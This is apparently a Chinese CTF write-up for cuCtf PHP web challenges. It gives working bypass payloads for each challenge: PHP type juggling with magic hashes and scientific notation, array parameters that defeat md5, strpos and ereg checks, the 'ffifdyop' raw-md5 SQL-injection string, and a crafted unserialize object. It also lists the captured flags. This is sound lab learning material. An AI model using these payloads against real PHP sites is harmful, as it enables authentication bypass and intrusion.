# 0x01 PHP入门
根据php代码
```
<?php

error_reporting(0);
require 'flag.php';
echo base64_encode(hex2bin(strrev(bin2hex($flag)))) . "<br>";

highlight_file(__FILE__);

?>
```
在线执行：
```
<?php

$a=bin2hex(strrev(bin2hex(base64_decode('13YWxmb1Rzcnlmb1VoZH9UdWdrdmRzRXNg=='))));

echo $a;
```
然后十六进制转字符串，执行两次：
得到flag
cuCtf{get_the_first_flag}

# 0x02 今天睡够了么？

>>> 60 * 60 * 24 * 30 * 2
5184000
>>> 60 * 60 * 24 * 30 * 3
7776000

我们传入的time的值需要在上面两个值之间

由于下面有int类型转换，我们可以利用这点进行绕过

int在转换科学计数法的时候只会保留e之前的数字

payload

6e6或0.6e7

cuCtf{How_long_did_I_sleep?}
# 0x03 havefun,funhash

| payload | 作用 |
|--|--|
| hash1=0e251288019 | 可以让md4过后的字符串和原来字符串在弱比较时表示相等 |
|hash2[]=1&hash3[]=2 |绕过两个变量的强比较|
|hash4=ffifdyop|使md5过后显示的值表示为`'or'6<乱码>  即  'or'66�]��!r,��b`|

payload:
`?hash1=0e251288019&hash2[]=1&hash3[]=2&hash4=ffifdyop`

# 0x04 休息一下吧打工人

反序列化漏洞：（贴一个自己的链接）

查看执行的逻辑

```
$KEY1 = "D0g3!!!";
$str1 = $_GET['str1'];
if (unserialize($str1) === "$KEY1")
{
    $b = $_GET['str2'];
    $c = unserialize($b);
}
```
payload：
?str1=O:9:"dagongren":2:{s:1:"a";s:4:"work";}

# 0x05 绕过练习

第一个需要绕过的判断：
password中只能含有数字或字母

ereg()这个函数只能处理字符串的，遇到数组做参数返回NULL，判断用的是 === ，其要求值与类型都要相同，而NULL跟FALSE类型是不同的，可以用这个绕过

第二个需要绕过的判断：
password的长度小于8并且值大于9999999

这里想到科学计数法
`1e8`,长度既小于八，值又大于9999999

第三个需要绕过的判断：
`strpos($_GET['password'], '*-*') !== FALSE`

strpos函数遇到数组，也返回NULL，与FALSE类型不同，if条件成立，输出flag

payload：
`?password[]=1e8`

Flag: cuCtf{Good_only_last_one}

# 0x06 多吃几个

还在做。。





